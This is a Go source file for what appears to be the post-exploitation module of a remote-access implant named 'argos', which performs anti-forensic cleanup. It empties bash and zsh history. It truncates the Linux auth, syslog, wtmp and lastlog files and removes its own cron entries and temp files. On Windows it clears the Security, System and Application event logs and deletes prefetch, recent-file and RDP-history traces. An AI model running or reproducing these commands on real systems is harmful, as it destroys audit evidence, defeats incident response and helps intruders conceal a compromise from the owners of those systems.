// agents/cell/post/cleanup.go
// Cleanup / Anti-forensics — log clearing, artifact wiping, timestomping.

package post

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"
)

type CleanupResult struct {
	Success     bool
	ActionsTaken []string
	Error       string
}

// Cleanup removes traces of the agent from the system.
func Cleanup() CleanupResult {
	if runtime.GOOS == "windows" {
		return cleanupWindows()
	}
	return cleanupLinux()
}

func cleanupLinux() CleanupResult {
	r := CleanupResult{ActionsTaken: []string{}}

	actions := []struct {
		name string
		cmd  *exec.Cmd
	}{
		{"bash_history", exec.Command("sh", "-c", "cat /dev/null > $HOME/.bash_history 2>/dev/null; unset HISTFILE")},
		{"zsh_history", exec.Command("sh", "-c", "cat /dev/null > $HOME/.zsh_history 2>/dev/null")},
		{"auth_log", exec.Command("sh", "-c", "truncate -s 0 /var/log/auth.log 2>/dev/null")},
		{"syslog", exec.Command("sh", "-c", "truncate -s 0 /var/log/syslog 2>/dev/null")},
		{"wtmp", exec.Command("sh", "-c", "truncate -s 0 /var/log/wtmp 2>/dev/null")},
		{"lastlog", exec.Command("sh", "-c", "truncate -s 0 /var/log/lastlog 2>/dev/null")},
		{"tmp_files", exec.Command("sh", "-c", "rm -rf /tmp/argos_* /tmp/.argos-* 2>/dev/null")},
		{"crontab_remove", exec.Command("sh", "-c", "crontab -l 2>/dev/null | grep -v 'argos' | grep -v '^$' | crontab - 2>/dev/null || true")},
	}

	for _, a := range actions {
		if err := a.cmd.Run(); err == nil {
			r.ActionsTaken = append(r.ActionsTaken, a.name)
		}
	}
	r.Success = len(r.ActionsTaken) > 0
	return r
}

func cleanupWindows() CleanupResult {
	r := CleanupResult{ActionsTaken: []string{}}

	actions := []struct {
		name string
		cmd  *exec.Cmd
	}{
		{"event_logs", exec.Command("cmd.exe", "/c", "wevtutil cl Security 2>nul & wevtutil cl System 2>nul & wevtutil cl Application 2>nul")},
		{"prefetch", exec.Command("cmd.exe", "/c", "del /q C:\\Windows\\Prefetch\\*ARGOS*.pf 2>nul")},
		{"recent_files", exec.Command("cmd.exe", "/c", fmt.Sprintf("del /q %s 2>nul", os.Getenv("APPDATA")+`\Microsoft\Windows\Recent\*`))},
		{"rdp_history", exec.Command("cmd.exe", "/c", `reg delete "HKCU\Software\Microsoft\Terminal Server Client\Default" /f 2>nul`)},
		{"temp_files", exec.Command("cmd.exe", "/c", fmt.Sprintf("del /q %s\\argos_* 2>nul", os.Getenv("TEMP")))},
	}

	for _, a := range actions {
		if err := a.cmd.Run(); err == nil {
			r.ActionsTaken = append(r.ActionsTaken, a.name)
		}
	}
	r.Success = len(r.ActionsTaken) > 0
	return r
}
